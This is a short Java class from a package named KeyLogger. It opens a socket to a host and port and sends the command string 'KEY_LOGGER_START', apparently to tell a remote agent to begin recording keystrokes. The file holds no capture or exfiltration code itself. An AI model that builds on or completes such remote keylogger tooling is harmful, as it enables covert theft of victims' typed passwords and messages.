package KeyLogger;

import java.io.ObjectOutputStream;
import java.net.Socket;

public class KeyLoggerStart {
	private Socket socket = null;
	private ObjectOutputStream oos = null;
	
	public KeyLoggerStart(String host,int port) {
		try {
			this.socket = new Socket(host,port);
			this.oos = new ObjectOutputStream(socket.getOutputStream());
		} catch (Exception e) {
			// TODO: handle exception
			e.getStackTrace();
		}
	}
	
	public void sendRequest() {
		try {
			oos.writeObject("KEY_LOGGER_START");
			oos.flush();
		} catch (Exception e) {
			// TODO: handle exception
			e.getStackTrace();
		}
	}
}
